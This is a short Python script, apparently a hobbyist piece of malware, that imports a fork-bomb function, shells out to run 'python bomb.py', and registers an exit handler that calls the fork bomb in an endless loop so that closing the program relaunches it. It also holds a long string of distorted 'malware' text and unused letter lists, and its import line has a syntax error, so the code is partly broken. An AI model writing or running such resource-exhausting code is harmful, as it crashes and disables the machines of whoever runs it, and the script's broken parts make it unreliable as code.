import os
import atexit
import random
import time
form forkbomb import forkbomb
def forked():
  malwar = "m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̛̔́̉́̽̄́̌͆̎̎̀̚͘a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜"
  randomlet = ["A", "a", "B", "b", "C", "c", "D", "d", "E", "e", "F", "f", "G", "g", "H", "h", "I", "i", "J", "j", "K", "k", "L", "l", "M","m", "N", "n", "O", "o", "P", "p", "Q", "q", "R", "r", "S", "S", "T", "t", "U", "u", "V", "v", "W", "x", "Y", "y", "Z", "z"]
  randonum = ["1", "2", "3", "4", "5", "6", "7", "8", "9"]
  number = 1
  os.system("python bomb.py")
  forkbomb()
    
@atexit.register
def goodbye():
  mal = True
  while mal == True:
    forkbomb()
